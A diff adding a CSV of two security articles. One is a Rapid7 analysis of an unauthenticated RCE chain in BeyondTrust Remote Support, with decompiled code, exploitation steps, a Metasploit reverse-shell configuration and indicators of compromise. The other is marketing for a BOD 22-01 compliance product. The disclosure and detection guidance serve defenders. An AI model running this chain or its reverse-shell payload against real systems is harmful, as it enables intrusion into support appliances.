@@ -1,0 +1,2305 @@
+ID,Story,Date,Category,Vendor,Source,Modules,Type,Title,Link,Context,Full Text
+a4c4fa3b52d7,a4c4fa3b52d7,2026-10-30 16:01 UTC,Vulnerabilities & Patching,Rapid7,Rapid7 Blog,File Security; Vulnerability Management; Identity Security Posture Management; Network Security,Article,Rapid7 Analysis: Unauthenticated File Upload to RCE in BeyondTrust Remote Support (CVE-2026-102764),https://www.rapid7.com/blog/post/ra-rapid7-analysis-unauthenticated-file-upload-to-rce-in-beyondtrust-remote-support-cve-2026-102764,Overview An origin-validation flaw in BeyondTrust Remote Support lets an unauthenticated attacker write files on the appliance and execute code as the site's operating-system user,"Overview
+
+An origin-validation flaw in BeyondTrust Remote Support lets an unauthenticated attacker write files on the appliance and execute code as the site's operating-system user. The entry point is the public customer connection used to start a support session. No account credentials or user interaction are required.
+
+The flaw sits between the internal message router, brain, and an appliance-side customer worker, thin-scc. An attacker can put a reserved local router ID into a message's source address. The router forwards the message, and the worker accepts that address as proof that the request came from a local component. This gives the attacker access to an internal file-transfer service, including its native filesystem provider.
+
+We first confirmed the file write then used the primitive to upload a PHP file to the site's public directory. Requesting that file gave us code execution as the site user. A Metasploit module now implements the chain with PHP and Unix Command targets.
+
+We tested Remote Support 24.1.2, build 1524046, revision 4208-ddcf90715106aa0c0e19c103f8d2c412af4beff3. The test appliance had public issue-menu session starts and thin chat enabled (default). Other affected releases and fixed builds have not been established. The VM's base appliance version of Secure Remote Access, 7.1.0, is separate from the Remote Support application version.
+
+Impact
+
+The attacker controls both the contents of an uploaded file and its destination path, subject to the worker's filesystem permissions. The same origin forgery also reaches the file-send operation. We used it to retrieve /proc/self/environ to determine the base installation path of the Remote Support before dropping the payload
+
+On the tested appliance, the native file service could write into the PHP document root. The Metasploit module returns code execution in the context of msfuser, UID 1000, which establishes unauthenticated remote code execution as the site user.
+
+Technical Analysis
+
+We will demonstrate how an attacker can start an anonymous session and then forge a message that the appliance will accept as local. Then outline how we can reach the native file transfer service, choose the uploaded file’s contents and destination and turn the file write into PHP execution.
+
+Addresses use Ghidra image base 0x100000. Subtract that value for the raw ELF virtual address. Function names beginning with FUN_ are Ghidra labels; descriptive names are taken from diagnostic strings where available.
+
+Starting an anonymous customer session
+
+We begin by obtaining two customer keys from POST /api/start_session. These are fresh public guest sessions. The keys let the client use the customer transport, but do not identify a logged-in account. Each guest connects through the /nw WebSocket endpoint, using either the native or thin customer protocol.
+
+source/app/write_app_chooser_config:
+
+echo ""ingredi support desk customer:|$BG_app_root/data/tmp/brain.sock"" # [A1] echo ""ingredi support desk customer thin:$BG_app_root/app/thin-scc-wrapper"" # [A2]
+
+app/write_app_chooser_config shows where the two customer protocols go. The native protocol reaches the brain socket at [A1]; the thin protocol launches a wrapper at [A2].
+
+source/app/thin-scc-wrapper:
+
+# ... omitted: protocol parsing and the alternative debug-site branch ... quoted=$(export PHPRC=""$BG_app_root/config/php-cli.ini""; echo $gskey | $ingrediRoot/app/dbquote) if [[ $(echo ""SELECT COUNT(1) FROM gw_sessions WHERE session_key = $quoted AND session_type = 'sdcust' AND (expiration IS NULL OR expiration>NOW())"" | $db) != ""1"" ]]; then # [A3] echo ""1 failure"" >&0 exit 0 fi # ... omitted: reconnect throttling, customer-name setup, and settings generation ...
+
+app/thin-scc-wrapper checks that the thin customer's key belongs to an unexpired sdcust session at [A3]. A key obtained through the public session-start endpoint passes this check.
+
+app/thin-scc-wrapper, after the session check:
+
+echo ""0 success"" >&0 workDir=`handleThinMint ""$thinMint""` || exit if [[ ! -f ""$workDir/thin-scc"" ]]; then pushd ""$workDir"" cp $ingrediRoot/app/thin-scc . # ... omitted: license, image, and settings.ini setup ... else pushd ""$workDir"" fi export BRAIN_MELD_SOCKET_PATH=$ingrediRoot/data/tmp/brain.sock # ... omitted: server-side environment initialization ... ./thin-scc # [A4] Starts the worker inside the appliance environment. exitStatus=$?
+
+The same wrapper then prepares a working directory and starts thin-scc at [A4]. This process runs on the appliance, even though it is handling an anonymous customer's thin session.
+
+The native connection gives us a client for the internal message-routing system, referred to here as MRS. The thin connection gives us an appliance-side worker to address. Neither step requires a representative to accept the session.
+
+A network message can claim to be local
+
+MRS addresses have three parts: node:router:handler. Each message carries source and destination addresses in a 36-byte header made up of nine little-endian 32-bit fields.
+
+Header offset
+
+Field
+
+Value used by the exploit
+
+0x04
+
+Source node
+
+The customer's normal node
+
+0x08
+
+Source router
+
+Changed to the reserved value 1
+
+0x0c
+
+Destination node
+
+The worker's node
+
+0x10
+
+Destination router
+
+The worker's router
+
+0x14
+
+Destination handler
+
+Main dispatcher, 2048, on the tested build
+
+0x24
+
+Payload
+
+Service name, newline, then packed fields
+
+app/brain — ingress check:
+
+if (*(int *)((long)param_2 + 0xc) == *(int *)(param_1 + 0x10)) { *(uint *)(param_2 + 4) = (uint)*(byte *)(param_2 + 4); if ((*(int *)(param_2 + 1) == *(int *)((long)param_1 + 0x84)) && (param_3 != (ulong **)0x0)) { // [B1] Rejects a network claim of this router's actual ID. if (lRam0000000001ec8610 != 0) { func_0x0168de00( 0x15, 3, ""dropping spoofed message that came in from the network but has a routerID of our own\n"" ); } } else if (*(int *)((long)param_1 + 0x84) == *(int *)(param_2 + 2)) { // ... omitted: delivery to a handler on this router ... } else { // ... omitted: TTL checks, route lookup, and forwarding branches ... } }
+
+app/brain has an anti-spoofing check in FUN_01566ae0, identified by its handleMessageFromOtherRouter diagnostic. At [B1], it rejects a network packet whose source router matches the receiving router's actual ID.
+
+Here, param_1 is the receiving router, param_2 is the packet, and param_3 is the incoming connection. Because param_2 points to eight-byte elements, *(int *)(param_2 + 1) reads the source router at byte offset 0x08.
+
+That leaves a gap: the check compares against the actual router ID, while downstream code also recognises a reserved local alias. On this appliance, the alias is 1.
+
+// ... omitted: destination route resolution, loop checks, and diagnostic logging ... FUN_0155ec40( ppuStack_1300, ppuVar6, param_2, // [B2] Forwards the packet carrying the caller-supplied source router. (int *)((long)param_2 + 0x24) );
+
+The forwarding path in the same app/brain function passes the packet onward at [B2]. It does not remove the source claim that matters to the worker's local-origin check.
+
+app/brain — local-address predicate:
+
+bool FUN_0155ad40(long param_1, int *param_2) { bool bVar1; bVar1 = false; if (*param_2 == *(int *)(param_1 + 0x80)) { // [C1] Address node must match the local node. bVar1 = true; if (param_2[1] != 1) { // [C2] Router 1 returns true without the actual-ID comparison. return *(int *)(param_1 + 0x84) == param_2[1]; } } return bVar1; }
+
+The local-address predicate makes the mismatch clear. In app/brain, FUN_0155ad40 first checks the node at [C1]. If that matches, router 1 is enough to return true at [C2]; the comparison with the actual local router is skipped.
+
+The rule is effectively node AND (router == 1 OR router == actual local router). An address supplied by a network client is being used to make that decision.
+
+app/thin-scc — message-origin wrapper:
+
+UNRECOVERED_JUMPTABLE = *(code **)(**(long **)(*param_1 + 8) + 0x50); (*UNRECOVERED_JUMPTABLE)( *(long **)(*param_1 + 8), param_1 + 0xb, // [C3] Uses the dispatched message's sender address at byte offset 0x58. UNRECOVERED_JUMPTABLE );
+
+The corresponding message wrapper in app/thin-scc, passes the message's sender address into its router object's local-address predicate at [C3]. Ghidra did not recover a reliable prototype for this indirect call; the caller consumes its result as a boolean.
+
+We checked this behaviour with the same file-service request under two origins. The ordinary customer source produced no file-service connection during a two-second observation. Changing the source router to 1 caused the worker to accept it.
+
+Reaching the native file-transfer service
+
+In app/thin-scc, FUN_0047a850 dispatches file-transfer messages.
+
+app/thin-scc — file-transfer dispatcher:
+
+cVar3 = func_0x0068e930(param_2); // [D1] Locality is derived from the message sender address. if (cVar3 == '\0') { if (lRam00000000009bade8 != 0) { puVar5 = (undefined8 *)func_0x0068efe0(param_2); func_0x00309380(0x66, 3, ""DISCARDING NONLOCAL MESSAGE: %s\n"", *puVar5); } } else { func_0x0046d370(aplStack_68, ""ftsName""); lVar7 = param_2 + 0x28; lVar1 = param_2 + 0x30; lVar6 = func_0x002a1970(lVar7, aplStack_68); if (lVar1 == lVar6) { puVar5 = (undefined8 *)0x9c3700; } else { puVar5 = (undefined8 *)(lVar6 + 0x40); } if ((puVar5[1] == *(long *)(param_1 + 0x2a8)) && ((puVar5[1] == 0 || (iVar4 = func_0x001804b0(*puVar5, *(undefined8 *)(param_1 + 0x2a0)), iVar4 == 0)))) { // [D2] Matches the requested filesystem service name. // ... omitted: string cleanup, optional reply check, and action dispatch shown below ... } // ... omitted: mismatched-name cleanup ... }
+
+It calls the origin wrapper at [D1] and discards a message if that wrapper says the sender is nonlocal. Once that check passes, [D2] matches ftsName against the service instance's name.
+
+The same function only validates responseAddress when the field is nonempty. The exploit omits it, taking the branch at [D3].
+
+app/thin-scc, reply-address handling in FUN_0047a850:
+
+func_0x0046d370(auStack_a8, ""responseAddress""); lVar6 = func_0x002a1970(lVar7, auStack_a8); if (lVar6 == lVar1) { lVar6 = 0x9c3700; } else { lVar6 = lVar6 + 0x40; } if (*(long *)(lVar6 + 8) == 0) { // [D3] No reply-address validation when the field is empty. func_0x001edfe0(auStack_a8); } else { func_0x0046d370(auStack_88, ""responseAddress""); lVar8 = func_0x002a1970(lVar7, auStack_88); lVar6 = lVar8 + 0x40; if (lVar8 == lVar1) { lVar6 = 0x9c3700; } func_0x006f2e80(auStack_b4, lVar6); func_0x0046d370(aplStack_68, ""processMessage""); cVar3 = func_0x0068e950(param_2, aplStack_68, auStack_b4); // [D4] // ... omitted: temporary string destruction ... if (cVar3 == '\0') goto LAB_0047a8be; }
+
+The validator called at [D4] compares the reply address against the message's sender address. It does not independently establish where that sender came from, so making this field mandatory would not fix the origin forgery.
+
+app/thin-scc, action handling in FUN_0047a850:
+
+// ... omitted: action extraction and unrelated action cases ... iVar4 = func_0x0046d240(uVar9, uVar2, ""DownloadAnonymousFiles""); if (iVar4 == 0) { uVar9 = FUN_00475820(param_1, param_2); // [D5] Receives a file into the selected provider. goto LAB_0047a8c0; } // ... omitted: DownloadFiles case ... iVar4 = func_0x0046d240(uVar9, uVar2, ""UploadFiles""); if (iVar4 == 0) { uVar9 = FUN_00477be0(param_1, param_2); // [D6] Sends a file from the selected provider. goto LAB_0047a8c0; }
+
+The dispatcher then exposes DownloadAnonymousFiles at [D5] and UploadFiles at [D6].
+
+The action names describe the worker's side of the transfer. DownloadAnonymousFiles receives bytes onto the appliance; UploadFiles sends a file out. To upload our file, we ask the worker to download it from an MRS listener we control.
+
+The important thing to note here is that the worker has more than one filesystem provider. The session service delegates filesystem work to the browser. A successful transfer through that service does not prove a file was written on the appliance. The local service uses native file objects instead.
+
+app/thin-scc — native service construction:
+
+uVar3 = func_0x00770620(0x310); plVar4 = (long *)func_0x00770620(8); func_0x003454a0(plVar4); // [E1] Constructs the native filesystem provider. pplStack_c0 = (long **)0x0; plStack_c8 = plVar4; pplStack_c0 = (long **)func_0x00770620(0x18); plVar1 = _DAT_007d4de0; pplStack_c0[2] = plVar4; pplStack_c0[1] = plVar1; *pplStack_c0 = (long *)&UNK_0098cee0; plStack_60 = (long *)0x5; uStack_58 = (long *)CONCAT26(uStack_58._6_2_, 0x6c61636f6c); // [E2] ASCII ""local"". plStack_68 = &uStack_58; FUN_00472550(uVar3, &plStack_68, param_3, &plStack_c8); // [E3] Service receives name and provider. param_1[0x9d] = uVar3; // ... omitted: string/provider reference cleanup and other ServerContext services ...
+
+The ServerContext constructor in app/thin-scc, FUN_002ae620, creates that native provider at [E1]. It builds the name local at [E2] and passes both to the file-transfer service constructor at [E3].
+
+The exploit therefore uses ftsName=local. The native file factory analysis follows this provider to the native file and filesystem-info constructors.
+
+Choosing the file contents and destination
+
+app/thin-scc, FUN_00475820 , handles DownloadAnonymousFiles.
+
+app/thin-scc — anonymous-download request:
+
+// ... omitted: overwrite/resume options and transfer metadata setup ... func_0x0046d370(aplStack_128, ""downloadToken""); lVar8 = func_0x002a1970(lVar12, aplStack_128); lVar6 = lVar8 + 0x40; if (lVar8 == param_2) { lVar6 = 0x9c3700; } func_0x001edf30(&puStack_68, lVar6); // [F1] Caller-supplied transfer token. func_0x0046d370(aplStack_148, ""serverAddress""); lVar8 = func_0x002a1970(lVar12, aplStack_148); lVar6 = lVar8 + 0x40; if (lVar8 == param_2) { lVar6 = 0x9c3700; } func_0x006f2e80(auStack_1e4, lVar6); // [F2] Caller-supplied MRS file-server address. func_0x0046d370(aplStack_168, ""path""); lVar8 = func_0x002a1970(lVar12, aplStack_168); lVar6 = lVar8 + 0x40; if (lVar8 == param_2) { lVar6 = 0x9c3700; } func_0x001edf30(aplStack_88, lVar6); // [F3] Caller-supplied destination path. uVar13 = (ulong)(iVar4 != 0); iStack_1e8 = func_0x004a21c0( param_1, aplStack_88, auStack_1e4, &puStack_68, auStack_198, iVar5 == 0 ); // [F4] Starts the download using the supplied path, server, and token. // ... omitted: temporary destruction and transfer-response construction ...
+
+The function reads the request's transfer token at [F1], MRS server address at [F2], and destination path at [F3]. All three reach the download routine at [F4].
+
+In this excerpt, lVar12 points to the request's field map. param_2 has already been advanced to its map-end sentinel; 0x9c3700 represents an absent value.
+
+app/thin-scc — MRS download connection:
+
+(**(code **)(**(long **)(param_1 + 8) + 0x18))( &lStack_d8, *(long **)(param_1 + 8), param_3, 10000 ); // [G1] Connects to the serverAddress supplied to this routine as param_3. if ((lStack_d8 == 0) || ((*(char *)(lStack_d8 + 0x30) != '\0' && (*(char *)(lStack_d8 + 0x31) != '\0')))) { uVar4 = 0; } else { // ... omitted: request-map initialization ... func_0x00490020(&plStack_68, ""request""); lVar5 = func_0x00202790(auStack_b8, &plStack_68); func_0x001f5f10( lVar5, 0, *(undefined8 *)(lVar5 + 8), ""get anonymous file"", 0x12 ); // [G2] // ... omitted: temporary key-string destruction ... func_0x00490020(&plStack_68, ""token""); uVar6 = func_0x00202790(auStack_b8, &plStack_68); func_0x001ee710(uVar6, param_4); // [G3] Copies the caller's downloadToken. // ... omitted: info field, serialization, send, and receive-thread setup ... }
+
+The download routine at 0x004a21c0 opens an MRS stream to our address at [G1]. It sends get anonymous file at [G2] with our token at [G3]. The token can be a 24 character random string because we control the listener.
+
+// ... omitted: stream setup, relay metadata, and reference management ... puVar7 = (undefined8 *)func_0x00770620(0x450); // ... omitted: temporary setup and resume calculation ... func_0x004a0700(puVar7, param_1, param_5, bVar8, param_7, param_8); puVar7[0x81] = lStack_d8; puVar7[0x82] = lVar5; *puVar7 = &UNK_0099d3f8; // ... omitted: relay address and transfer bookkeeping ... func_0x001ee710(puVar7 + 0x13, param_2); // [G4] Retains the requested destination path. // ... omitted: transfer registration and reference management ... func_0x002fcae0(puVar7, 0x400000); // [G5] Starts the receive-files thread.
+
+The same app/thin-scc routine puts the destination path into a receive-files thread at [G4] and starts it at [G5].
+
+app/thin-scc — receive-files loop:
+
+// ... omitted: ""want file?"" command match ... func_0x00490020(ppplVar20, ""dest_filename""); uVar12 = func_0x00202790(plStack_888, ppplVar20); puStack_8b8 = &uStack_418; func_0x001edf30(puStack_8b8, uVar12); // [H1] Copies the destination from transfer metadata. // ... omitted: provider filesystem-info query and reference cleanup ... bStack_931 = *(byte *)(plStack_848 + 0x1c); pplStack_8d8 = (long **)(((ulong)pplStack_8d8 & 0xffffffffffffff00 | (ulong)bStack_931) ^ 1); puStack_900 = auStack_3f8; if (bStack_931 == 1) { func_0x001edf30(puStack_900, puStack_8b8); } else { func_0x001fabe0(puStack_900, puStack_8b8, "".n$t""); // [H2] Temporary receive path. }
+
+The receive loop at 0x001d6430 consumes the file metadata we send over that stream. It copies dest_filename at [H1]. Depending on the provider's file information, it receives into that path or a temporary path ending in .n$t at [H2].
+
+// ... omitted: ""begin file"" handling and provider file-object creation ... func_0x00321f50(plStack_828, puStack_928); plVar11 = plStack_828; pcVar19 = *(code **)(*plStack_828 + 0xc0); func_0x00490020(ppplVar20, ""a+b""); cVar5 = (*pcVar19)(plVar11, puStack_900, ppplVar20, lStack_908); // [H3] Opens the receive file. // ... omitted: open-failure handling, positioning, and transfer-loop branches ... iVar7 = (**(code **)(*plVar11 + 0x20))(plVar11, plVar1, pplVar21, pplVar25, 1); if (0 < iVar7) { pplStack_8d8 = (long **)(long)iVar7; lVar14 = *plStack_828; *(long *)(param_1 + 0x160) = (long)pplStack_8d8 + *(long *)(param_1 + 0x160); *(long *)(param_1 + 0x168) = (long)pplStack_8d8 + *(long *)(param_1 + 0x168); iVar9 = (**(code **)(lVar14 + 0xd8))(plStack_828, plVar1); // [H4] Writes received data. if (iVar7 != iVar9) { // ... omitted: errno extraction and ""error writing to file"" response ... } // ... omitted: progress and completion handling ... }
+
+After the omitted begin file code has executed, the same app/thin-scc receiver opens the file at [H3] and writes incoming data at [H4].
+
+On completion, the receiver closes the file and, when a temporary path is used, renames it to the final destination. The service already accepts an absolute destination path, so no directory traversal is needed. The worker allows the request because it trusts the forged local source address.
+
+From file upload to PHP execution
+
+The next step is to choose a writable location that the web server would execute. The supplied config/apache_vhost.conf sets the document root to:
+
+/home/msfuser/ingredi-24.1.2/app/www/public
+
+An absolute upload into that directory succeeded. There is a small catch when requesting the file: a URL ending in .php returns 404, even while the file existed. app/www/public/.htaccess explains why.
+
+source/app/www/public/.htaccess:
+
+# ... omitted: application routes and compatibility rewrites ... RewriteCond %{THE_REQUEST} ""^[^ ]* .*?\.php[?/ ].*$"" # [I1] Direct .php URLs return 404. RewriteRule .* - [L,R=404] # ... omitted: download-helper routes ... RewriteCond %{REQUEST_FILENAME} !-d RewriteCond %{REQUEST_FILENAME}\.php -f # [I2] An extensionless URL executes the existing PHP file. RewriteRule ^(.+)$ $1.php [L]
+
+The rule at [I1] rejects a direct .php request. The rule at [I2] maps an extensionless URL to an existing PHP file.
+
+Requesting the uploaded basename without .php executed our payload. It returned its absolute filename, EUID 1000, and the output of id.
+
+We also wanted to avoid guessing Remote Support’s working directory or the versioned installation name. The same native service can send us the worker's /proc/self/environ using UploadFiles. On this appliance, it contains:
+
+BG_app_root=/home/msfuser/ingredi-24.1.2 BRAIN_MELD_SOCKET_PATH=/home/msfuser/ingredi-24.1.2/data/tmp/brain.sock
+
+BG_app_root gives us the installation directory directly. Appending /app/www/public gives the upload destination; the socket path provides another way to identify the same root. There is one protocol wrinkle: procfs reports the environment file's size as zero, but the worker still streams its contents. We have to read through the data stream's EOF instead of stopping at the advertised size.
+
+Exploit
+
+The Metasploit module carries out the chain using two fresh public customer sessions. It discovers the thin worker through Director.GetGatewaySessionValues for its own thin guest, sends the forged LocalFileTransfer request to the worker's main dispatcher, and serves the PHP bytes over its existing MRS connection. A separate upload server is not needed.
+
+The module writes a random PHP filename into the site's public directory, then POSTs an execution token to the extensionless URL. The PHP file checks that token and unlinks itself before executing the payload. Target 0 runs a PHP payload; target 1 wraps a Unix command in PHP.
+
+For a PHP Meterpreter payload, the basic configuration is:
+
+use exploit/linux/http/beyondtrust_rs_mrs_file_upload set RHOSTS 192.168.1.98 set TARGET 0 set PAYLOAD php/meterpreter/reverse_tcp set LHOST 192.168.1.68 run verbose=true
+
+Select target 0 and a compatible command payload, such as php/meterpreter/reverse_tcp. The module documentation covers the directory override and other options.
+
+Figure 1: Exploiting the anonymous file-transfer service with Metasploit.
+
+Testing produced two PHP Meterpreter sessions, a command-wrapped PHP Meterpreter session, and a Bash shell. Both targets also ran with AutoCheck disabled, and immediate repeat exploitation succeeded. The Bash shell returned:
+
+uid=1000(msfuser) gid=1000(msfuser) groups=1000(msfuser),16(cron),70(postgres)
+
+IOCs
+
+The excerpts below cover HTTP requests, native file-transfer activity in thin-scc, and customer connections recorded by brain. They come from our lab runs on 28–29 October 2026. Original timestamps, addresses, and paths are retained; session and transfer tokens are redacted where noted. Unrelated entries are omitted.
+
+The site logs are stored under $BG_app_root/log/, where BG_app_root identifies the Remote Support installation directory:
+
+Log
+
+Evidence shown below
+
+httpd_access.log
+
+Public session creation and requests to uploaded PHP endpoints
+
+thin-scc.log
+
+Native file-transfer stream creation and routing errors
+
+thin-scc-errors.log
+
+Rejected file-transfer requests, including the action and destination path
+
+brain.log
+
+Customer connection records with client addresses and timestamps
+
+Active workers also keep logs under $BG_app_root/data/tmp/sdcust_thin_client/<thinMint>/; the collection details below explain how these reach the site log directory. The installation path varies between appliances.
+
+Requests to an uploaded PHP endpoint
+
+The command-only Metasploit run created two public customer sessions, invoked its uploaded PHP endpoint, and then checked that the endpoint had gone. The relevant access-log lines are:
+
+192.168.1.68 [28/Oct/2026:21:12:23 +0000] ""POST /api/start_session HTTP/1.1"" [0s] [Stat:200] [Size:1481] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0] 192.168.1.68 [28/Oct/2026:21:12:23 +0000] ""POST /api/start_session HTTP/1.1"" [0s] [Stat:200] [Size:1481] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0] 192.168.1.68 [28/Oct/2026:21:12:31 +0000] ""POST /qdgusthrmlirprls HTTP/1.1"" [0s] [Stat:200] [Size:0] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0] 192.168.1.68 [28/Oct/2026:21:12:38 +0000] ""POST /qdgusthrmlirprls HTTP/1.1"" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Mozilla/5.0 (Macintosh; Intel Mac OS X 14.7; rv:133.0) Gecko/20100101 Firefox/133.0] 192.168.1.68 [28/Oct/2026:21:12:43 +0000] ""GET /qdgusthrmlirprls HTTP/1.1"" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9]
+
+Here, /qdgusthrmlirprls mapped to qdgusthrmlirprls.php in the public directory. The first POST ran the command and returned 200. The later POST was the module's cleanup request; the GET independently checked the endpoint. Both received 404 after the file had deleted itself.
+
+This gives defenders a sequence to investigate: public session creation followed by a request to a new, unfamiliar endpoint, potentially followed by 404s for the same path. Session creation alone is normal Remote Support activity. A 200 followed by a 404 is also insufficient by itself; correlate the requests with file changes, session records, and any unusual outbound connections.
+
+The URL may not contain .php
+
+The earlier PHP canary produced these lines:
+
+192.168.1.68 [28/Oct/2026:20:50:07 +0000] ""GET /msfcanary03d80193f0880b.php HTTP/1.1"" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9] 192.168.1.68 [28/Oct/2026:20:50:35 +0000] ""GET /msfcanary03d80193f0880b HTTP/1.1"" [0s] [Stat:200] [Size:368] [Ref:-] [UA:Python-urllib/3.9] 192.168.1.68 [28/Oct/2026:20:50:35 +0000] ""GET /msfcanary03d80193f0880b HTTP/1.1"" [0s] [Stat:404] [Size:18] [Ref:-] [UA:Python-urllib/3.9]
+
+The direct .php request failed, while the extensionless request executed the same file. The final 404 followed self-deletion. Detection that only searches for requests ending in .php would miss the successful request in this example.
+
+The native transfer itself travels inside the customer MRS connection. These access-log entries show the HTTP trigger, not the file contents or the forged router ID. The captured HTTP log does not expose the inner MRS messages, so it cannot establish the origin bypass on its own.
+
+Files and connections
+
+Look for unexpected PHP files under the site's public directory and receive files ending in .php.n$t. An interrupted transfer may leave the temporary file even if the final URL returns 404. The .n$t suffix also belongs to the normal transfer implementation, so its presence needs context.
+
+Native file-transfer traces
+
+thin-scc.log and thin-scc-errors.log contain more direct evidence of the file-service requests. For example, this line from thin-scc-errors.log names the action, native provider, and intended PHP destination. Only ckey and downloadToken have been redacted:
+
+20261029 17:01:33 999999 thin-scc 11801:proc{LocalFileTransfer}(t11832) FT:WARNING>DISCARDING NONLOCAL MESSAGE: LocalFileTransfer:action=DownloadAnonymousFiles;ckey=<REDACTED>;downloadToken=<REDACTED>;enableResume=0;ftsName=local;path=/home/msfuser/ingredi-24.1.2/app/www/public/envresolve28f788af6a1c39bf.php;serverAddress=1:1022182175:9000;wantOverwritePrompts=0
+
+This was our negative control: the request used the customer's ordinary source address and was rejected. It is evidence of an attempted invocation, not a successful upload. The forged local source passes the check that produces this warning, so a successful exploit need not leave a DISCARDING NONLOCAL MESSAGE entry.
+
+The successful PHP module run left these lines in thin-scc.log:
+
+20261029 17:06:37 319 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_STREAM:INFO>createStream: connecting to address 1:1129726787:1031 20261029 17:06:37 2 thin-scc 14419:proc{LocalFileTransfer}(t14486) MRS_CL:ERROR>nodeID not found in node list even after renumerating: 0 20261029 17:06:37 0 thin-scc 14419:proc{LocalFileTransfer}(t14486) MSG_DSP:ERROR>failed to create a mailbox for sending to: 0:0:0
+
+Our requests omit responseAddress. The handler starts the transfer, then tries to send its action response to an empty address. That produces the 0:0:0 error without preventing the file write. The payload callback independently confirms execution at 17:06:37.
+
+Look for this combination in the proc{LocalFileTransfer} context, especially around unfamiliar PHP requests or outbound connections. The 1:1129726787:1031 value identifies an internal MRS mailbox; use the brain connection records below for the client IP. These entries do not identify the written filename or prove execution on their own. The empty-address errors also depend on how the exploit request is constructed; another implementation may leave different traces.
+
+Brain connection records
+
+brain.log helps link the activity to a client address. These two entries preceded the same module run:
+
+20261029 17:06:30 0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 47 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '0' 20261029 17:06:30 0 brain 6339:lstner(t06500) BRN_LSTN:INFO>received fd: 49 app name: 'ingredi support desk customer' and remoteIPAddress: '192.168.1.68' and localIPAddress: '192.168.1.98' and isLoopback '1'
+
+These are useful for a timeline, but customer connections are normal activity. We found no UploadFiles or DownloadAnonymousFiles action records in the captured brain logs. Generic EOF, connection-reset, and conference errors also appeared; they are too broad to treat as exploit indicators by themselves.
+
+Where to collect the native logs
+
+The aggregated logs are under $BG_app_root/log/. While a worker is running, its own logs are under $BG_app_root/data/tmp/sdcust_thin_client/<thinMint>/. The wrapper appends those logs to the site's log directory when the worker exits, then clears the per-worker copies. Collect both locations when investigating a live session.
+
+The captured brain.ini and thin-scc.ini both had the debug output disabled with enabled=0. No debug log was captured, and we did not change the logging configuration. Brain's debug configuration also limits MRS_* categories to Info, so enabling its debug output alone would not guarantee detailed message payloads.
+
+Names such as UploadFileStarted and DownloadFileEnded occur in the native protocol's callback code, but we did not find them in the collected logs. They should not be presented as default audit events"
+92ee48ab3bf6,92ee48ab3bf6,2026-10-28 13:16 UTC,"Policy, Legal & Compliance",Rapid7,Rapid7 Blog,Compliance Management; Threat and Exposure Management; Vulnerability Management,Article,How Rapid7 InsightGovCloud Supports BOD 22-01 Compliance,https://www.rapid7.com/blog/post/pt-insightgovcloud-supports-bod-22-01-compliance,"By establishing a catalog of known exploited vulnerabilities (KEVs) and emphasizing a risk-based, prioritized approach, it provides a clear model for organizations to strengthen...","An introduction to CISA’s BOD 22-01
+
+Issued nearly four years ago, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) Binding Operational Directive 22-01 (BOD 22-01) has been adopted across both public and private sector organizations as a framework to ensure timely remediation of vulnerabilities being exploited by adversaries. By establishing a catalog of known exploited vulnerabilities (KEVs) and emphasizing a risk-based, prioritized approach, it provides a clear model for organizations to strengthen their cybersecurity posture and reduce exposure to real-world threats.
+
+InsightGovCloud, Rapid7’s FedRAMP-authorized suite of security solutions, helps organizations implement BOD 22-01 by providing automated vulnerability scanning, real-time alerts for KEVs, and reporting aligned with regulatory requirements. Public and private sector teams can quickly identify at-risk assets, prioritize remediation efforts based on active exploitation, and maintain an auditable record of compliance. By leveraging our secure, cloud-based platform, organizations gain continuous visibility, streamlined vulnerability management, and the confidence that remediation aligns with federal cybersecurity standards.
+
+How InsightGovCloud stacks up against key BOD 22-01 requirements
+
+Requirement 1: Maintain continuous inventory and visibility
+
+InsightVM, included in the suite, supports continuous and automated discovery of both external and internal assets through Discovery Connections, which allow organizations to continuously poll network sources like Active Directory, AWS, and Azure to enumerate connected hosts and launch scans.
+
+For cloud environments, Rapid7 InsightCloudSec will continuously inventory the entire environment for the creation of new resources and automatically scan and assess those resources against compliance frameworks.
+
+Rapid7 also maintains up-to-date inventory of CISA KEVs with an industry leading 90% coverage for both on-premise and cloud based host vulnerabilities.
+
+Requirement 2: Remediate CISA KEV findings on a prioritized schedule
+
+Continuous ingestion of CISA KEV catalog by Rapid7 ensures that detection and prioritization of KEV’s can be streamlined and native to one platform.
+
+Automatically detect and triage assets with KEVs across cloud and hybrid environments.
+
+Prioritize CISA KEV’s across your entire environment and establish remediation projects to quickly and collaboratively remediate KEVs.
+
+Requirement 3: Establish policies and enforcement
+
+Collaborative remediation and compliance goals automatically track and assign vulnerabilities to the right teams with organizational defined timelines and real time dashboards to measure progress.
+
+Requirement 4: Automate reporting
+
+Rapid7 has predefined exports in Cyberscope XML reporting format for seamless ingestion into reports for CyberScope submissions as per CyberScope Automated Data Feeds Submission Manual published by the U.S. Office of Management and Budget.
+
+Built-in audit trail to demonstrate adherence with BOD 22-01.
+
+Why agencies and contractors choose InsightGovCloud
+
+Rapid7 InsightGovCloud is designed to support the rigorous requirements of state and local government agencies. The benefits are many, but among the top are its deployment into a FedRAMP Authorized environment – meeting federal security and compliance requirements at every level – its seamless integration into an existing security ecosystem, and its out-of-the-box alignment with CISA and CMMC security mandates.
+
+Agencies and contractors enjoy a future-proof tool in that Rapid7 is continuously updating against the ever-growing KEV catalog, as well as unmatched visibility and control through leadership-friendly reporting. Get to know the platform better here."
